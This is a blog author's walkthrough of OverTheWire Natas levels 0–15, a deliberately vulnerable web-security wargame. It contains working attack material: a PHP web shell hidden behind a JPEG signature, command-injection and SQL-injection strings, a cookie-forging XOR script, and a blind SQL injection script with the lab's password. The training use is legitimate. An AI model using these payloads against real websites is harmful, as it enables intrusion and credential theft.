---
title: "Wargames - OverTheWire Natas"
date: 2019-02-15T22:41:32+11:00
author: Cameron Wang
description: Write-Up of my OverTheWire Natas wargame.
---
## natas0 -> natas1
- View Page Source

## natas 1 -> natas2
- View Page Source (using shortcut: fn + f12)

## natas2 -> natas3
1. View Page Source
2. Go To: /files
3. View 'users.txt'

## natas3 -> natas4
robots.txt

1. View: /robots.txt
2. Go To: /s3cr3ts
3. View 'users.txt'

## natas4 -> natas5
Packet Manipulation

1. Use Burp Suite to intercept Packet
2. Locate Referer in Packet
3. Modify Referer To: http://natas5.natas.labs.overthewire.org/

## natas5 -> natas6
Cookie Manipulation

1. Use Burp Suite to intercept Packet
2. Locate Cookie in Packet
3. Modify loggedin=0 To: loggedin=1

## natas6 -> natas7
1. View Webpage Source Code
2. Go To: /includes/secret.inc
3. View Page Source
4. Input Secret Hidden in Page Source

## natas7 -> natas8
1. View Page Source
2. Enter Password Directory Location in the PHP in the URL

	- index.php?page=/etc/natas_webpass/natas8

## natas8 -> natas9
Cryptography

1. View Webpage Source Code
2. Convert encoded string: "3d3d516343746d4d6d6c315669563362" from Hexadecimal to ASCII
3. Reverse ASCII String: "==QcCtmMml1ViV3b"
4. Decode Base64 String: "b3ViV1lmMmtCcQ=="
5. Input Secret: "oubWYf2kBq"

## natas9 -> natas10
Unsanitized/Unfiltered Inputs

1. View Webpage Source Code
2. In the Search Bar, Enter Unix Commands

	- When using the passthru() function, inputs are not properly sanitized, allowing input commands to be executed.
	
3. Input: "/etc/natas_webpass/natas10"

## natas10 -> natas11
Bypassing Filters

1. View Webpage Source Code

	- Certain Characters are Being Filtered
	
2. In the Search Bar, Input: ".* /etc/natas_webpass/natas11 #"

	- '\*' is the wildcard character, which locates any character
	- '#' is the comment character, which converts all strings after the character into non-exeutable characters
	- Utilizing the grep command, the command outputs all files and comments out 'dictionary.txt'

## natas11 -> natas12
XOR Encryption

Cookies are protected using XOR encryption

1. View Webpage Source Code

	- Read the source code to understand the encryption
	- XOR encryption uses a key to encrypt
	
2. Using Burp Suite, copy the encrypted cookie data
3. Adjust the xor_encryption PHP function to obtain the encryption key

	- Code:

~~~
<?  
$orig_cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');  
function xor_encrypt($in) {  
  $text = $in;  
  $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));  
  $outText = '';  
  // Iterate through each character  
  for($i=0;$i<strlen($text);$i++) {  
  $outText .= $text[$i] ^ $key[$i % strlen($key)];  
  }  
  return $outText;  
}  
print xor_encrypt($orig_cookie);
?>
~~~

4. Using the key: "qw8j", encrypt a new base64-encoded data cookie, with "showpassword"=>"yes"

	- Code:

~~~
function xor_encrypt() {  
  $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));  
  $key = "qw8J";    
  $outText = '';  
  // Iterate through each character  
  for($i=0;$i<strlen($text);$i++) {  
  $outText .= $text[$i] ^ $key[$i % strlen($key)];  
  }  
  return $outText;  
}  
print base64_encode(xor_encrypt());
~~~

Walkthrough/Code Used: http://raidersec.blogspot.com/2012/10/overthewire-natas-wargame-level-11.html

## natas12 -> natas13
[Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)

1. View Webpage Source Code

	- PHP code does not check the file uploaded, only the size and creating the path and directory to store the file
	
2. Create PHP Script:

~~~
<?  
 // Rudimentary Shell   
 passthru($_GET['cmd']);  
?>
~~~

3. Upload PHP Script
4. Using burp Suite, modify the packet so that the filename and type of the script is the PHP script
5. Browse to the file URL using: "[filename].php?cmd=cat /etc/natas_webpass/natas13"

Walkthrough/Code Used: http://raidersec.blogspot.com/2012/10/overthewire-natas-wargame-level-12.html

## natas13 -> natas14
Magic Numbers

[List of File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

1. View Webpage Source Code

	- PHP now checks filetype through exif_imagetype() function
	- exif_imagetype() function checks file signature

2. Using Python, create a PHP script which includes the JPEG File Signature/Magic Number

	- Adding the File Signature to the beginning of the PHP file tricks the function into thinking the uploaded file is a JPEG rather than a PHP script
	- Code:
	
~~~
>>> fh = file.open('shell.php', 'w')
>>> fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET['cmd']); ?>')
>>> fh.close()
~~~
	
3. Upload PHP Script
4. Using burp Suite, modify the packet so that the filename and type of the script is the PHP script
5. Browse to the file URL using: "[filename].php?cmd=cat /etc/natas_webpass/natas14"

Walkthrough/Code Used: http://raidersec.blogspot.com/2012/10/overthewire-natas-wargame-level-13.html

## natas14 -> natas15
SQL Injection - Bypassing Login Screens

[SQL Injection Cheat Sheet - Bypass Login](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens)

1. View Webpage Source Code

	- Website uses MySQL for Login

2. Input Username: "administrator"
3. Input Password: "" OR 1=1#"

	- "#" character is a comment character in MySQL
	
## natas15 -> natas16
Blind SQL Injection

[SQL Injection Cheat Sheet - Blind SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#BlindSQLInjections)

1. View Webpage Source Code

	- There is no password field for this query
	- However, using binary searching and blind SQLi, the password can be determined

2. Using Python, program a script which will test characters that match with the password stored in the password field in the 'users' table

	- Code:

~~~
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    if 'exists' in r.text :
        filtered = filtered + char

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break
~~~

Walkthrough/Code Used: https://www.abatchy.com/2016/11/natas-level-14-and-15
